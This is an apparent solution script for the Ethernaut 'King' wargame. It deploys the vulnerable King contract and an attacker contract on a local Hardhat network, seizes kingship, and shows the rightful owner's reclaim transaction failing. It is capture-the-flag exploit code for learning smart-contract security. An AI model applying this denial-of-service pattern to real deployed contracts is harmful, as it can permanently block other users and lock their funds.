const { network, deployments, ethers, getNamedAccounts } = require("hardhat");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();

  const King = await ethers.getContractFactory("King");
  const king = await King.deploy({ value: "10" });
  await king.deployed();

  console.log("le king : ", await king._king());
  console.log("le prize : ", await king.prize());

  const KingHack = await ethers.getContractFactory("KingHack");
  const kingHack = await KingHack.deploy();
  await kingHack.deployed();

  const hackerKing = await king.connect(addr1);
  const hackerKingHack = await kingHack.connect(addr1);

  // ------------ let's hack -------------

  await hackerKingHack.send(king.address, { value: "100" });

  console.log("le king : ", await king._king());
  console.log("le prize : ", await king.prize());

  try {
    await owner.sendTransaction({ to: king.address, value: "1000" });
  } catch (error) {}

  console.log("le king : ", await king._king());
  console.log("le prize : ", await king.prize());
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
